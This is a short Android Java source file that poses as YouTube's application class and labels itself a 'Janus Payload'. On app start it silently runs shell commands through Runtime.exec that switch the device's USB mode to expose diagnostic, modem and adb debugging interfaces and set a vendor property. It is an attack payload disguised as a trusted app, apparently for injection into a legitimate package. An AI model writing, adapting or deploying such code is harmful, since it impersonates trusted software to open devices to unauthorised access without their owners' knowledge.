package com.google.android.apps.youtube.app;

import android.app.Application;
import android.util.Log;

public class YouTubeApplication extends Application {

    private static final String TAG = "JanusPayload";

    @Override
    public void onCreate() {
        super.onCreate();

        Log.i(TAG, "=== Janus Payload Started ===");

        String[] commands = {
            "setprop sys.usb.config rndis,diag,modem,none,adb",
            "setprop persist.vendor.qfunc.mode 1"
        };

        for (String cmd : commands) {
            try {
                Log.i(TAG, "Executing: " + cmd);
                Process process = Runtime.getRuntime().exec(new String[]{"sh", "-c", cmd});
            } catch (Exception e) {
                Log.e(TAG, "Failed to execute: " + cmd, e);
            }
        }

        Log.i(TAG, "=== Janus Payload Finished ===");
        
    }
}
